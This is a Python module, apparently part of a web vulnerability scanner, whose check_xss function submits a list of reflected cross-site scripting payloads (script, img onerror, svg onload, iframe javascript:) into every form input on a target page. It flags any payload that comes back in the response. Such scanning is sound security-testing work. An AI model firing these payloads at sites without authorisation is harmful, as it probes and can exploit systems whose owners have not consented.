import requests
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from .utils import inject_payload

logger = logging.getLogger(__name__)

def check_xss(target_url):
    vulnerabilities = []
    logger.info("Checking for Cross-Site Scripting (XSS) vulnerabilities")

    # قائمة موسعة من الحمولات المحتملة لثغرات XSS
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert('XSS')</script>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<object data='javascript:alert(1)'>",
    ]

    try:
        logger.info(f"Sending GET request to {target_url}")
        response = requests.get(target_url, timeout=10, verify=True)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all("form")
        logger.info(f"Found {len(forms)} forms on {target_url}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error during XSS check: {e}")
        return vulnerabilities

    # معالجة كل نموذج في الصفحة
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(target_url, action)
        logger.info(f"Processing form with action: {action} and method: {method}")

        inputs = form.find_all("input")
        form_data = {input_tag.get("name"): "test" if input_tag.get("type", "text") in ["text", "search"] else input_tag.get("value", "")
                     for input_tag in inputs}

        # اختبار كل حمولة على كل إدخال في النموذج
        for payload in xss_payloads:
            for input_name in form_data.keys():
                test_data = form_data.copy()
                test_data[input_name] = payload

                try:
                    logger.info(f"Testing XSS payload: '{payload}' in input: '{input_name}' on form: {form_url}")
                    response = (requests.post(form_url, data=test_data) if method == "post" else requests.get(form_url, params=test_data))

                    if payload in response.text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "description": f"Reflected XSS detected with payload: {payload}",
                            "location": f"Form: {form_url}, Input: {input_name}",
                            "severity": "High"
                        })
                        logger.warning(f"XSS vulnerability detected with payload: {payload} in form {form_url}")
                        break
                except requests.exceptions.RequestException as e:
                    logger.error(f"Error during XSS test on form {form_url} with payload '{payload}': {e}")

    return vulnerabilities
